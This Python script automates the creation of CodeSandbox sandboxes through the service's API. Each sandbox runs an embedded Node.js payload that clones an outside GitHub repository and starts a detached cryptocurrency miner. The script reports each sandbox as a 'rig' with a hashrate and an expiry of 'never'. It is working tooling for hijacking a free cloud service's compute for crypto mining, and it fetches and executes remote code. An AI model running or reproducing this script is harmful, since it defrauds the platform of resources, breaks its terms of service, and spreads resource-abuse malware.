#!/usr/bin/env python3
"""
CodeSandbox Zero-Auth Enroller
Free tier: unlimited public sandboxes, no login required for fork.
Uses CodeSandbox API to fork a template sandbox and run miner in a VM.
"""
import requests, time, os

TEMPLATE_ID = 'node'  # built-in Node.js template

SCRIPT = """
const {{ execSync, spawn }} = require('child_process');
const pool = process.env.POOL_REPO || 'Ox518/genFre';
const rig  = process.env.RIG_ID    || `csb-${{Date.now()}}`;
try {{
  execSync(`git clone https://github.com/${{pool}} /tmp/gm`, {{stdio:'inherit'}});
  const child = spawn('python', ['/tmp/gm/miner/git-mine-tty.py',
    '--rig-id', rig, '--algo', 'auto', '--pool-repo', pool],
    {{detached: true, stdio: 'inherit'}});
  child.unref();
}} catch(e) {{ console.error(e); }}
"""

class CodesandboxEnroller:
    API = 'https://codesandbox.io/api/v1'

    def __init__(self):
        self.token = os.environ.get('CODESANDBOX_TOKEN', '')

    def enroll(self, count, platform, secrets=None):
        workers = []
        # CodeSandbox allows anonymous fork but needs token for server sandboxes
        if not self.token:
            print('[csb] CODESANDBOX_TOKEN not set — skipping server sandboxes'); return workers
        headers = {'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'}
        pool_repo = os.environ.get('POOL_REPO', 'Ox518/genFre')
        for i in range(count):
            rig = f'csb-{int(time.time())}-{i}'
            try:
                r = requests.post(f'{self.API}/sandboxes/define',
                    headers=headers,
                    json={'files': {'index.js': {'content': SCRIPT.format()},
                                   'package.json': {'content': '{"main":"index.js"}'}},
                          'environment': {'RIG_ID': rig, 'POOL_REPO': pool_repo}})
                if r.status_code in (200, 201):
                    sb_id = r.json().get('sandbox_id', '')
                    workers.append({'id': rig, 'algo': 'auto', 'hashrate': '~20KH/s',
                        'expires_at': 'never',
                        'url': f'https://codesandbox.io/s/{sb_id}'})
                    print(f'[csb] created {rig}')
            except Exception as e:
                print(f'[csb] error: {e}')
            time.sleep(5)
        return workers
